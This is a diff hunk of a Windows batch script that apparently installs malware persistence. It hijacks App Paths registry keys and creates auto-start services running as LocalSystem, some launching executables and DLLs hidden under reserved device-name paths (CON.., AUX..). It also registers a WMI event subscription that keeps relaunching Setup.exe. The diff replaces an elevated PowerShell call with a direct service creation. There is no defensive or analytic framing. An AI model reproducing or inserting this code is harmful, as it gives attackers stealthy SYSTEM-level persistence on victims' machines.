@@ -24,11 +24,11 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\setup.exe" /t REG_SZ /d "%WINDIR%\System32\oobe\Setup.exe" /f
 
 sc create NetworkConfiguration binPath="%WINDIR%\System32\cmd.exe /c start start.exe" start="auto" obj="LocalSystem"
+sc create PerformanceMonitor binPath="%WINDIR%\System32\cmd.exe /c start install.exe" start="auto" obj="LocalSystem"
 sc create Layer binPath="%ProgramData%\CON..\Input.exe %ProgramData%\CON..\Kape.dll" start="auto" obj="LocalSystem"
 sc create Update binPath="%ProgramData%\AUX..\Input.exe %ProgramData%\AUX..\Icon.dll" start="auto" obj="LocalSystem"
 sc config Layer start= delayed-auto
 sc config NetworkConfiguration start= delayed-auto
-powershell -Command "Start-Process cmd.exe -ArgumentList '/c sc create PerformanceMonitor binPath=\"%WINDIR%\System32\cmd.exe /c start install.exe\" start=auto obj=LocalSystem' -Verb runAs"
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='SCM'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 180 WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''} | Out-Null"
 powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='SCM'; CommandLineTemplate='%WINDIR%\System32\cmd.exe /c start Setup.exe'} | Out-Null"
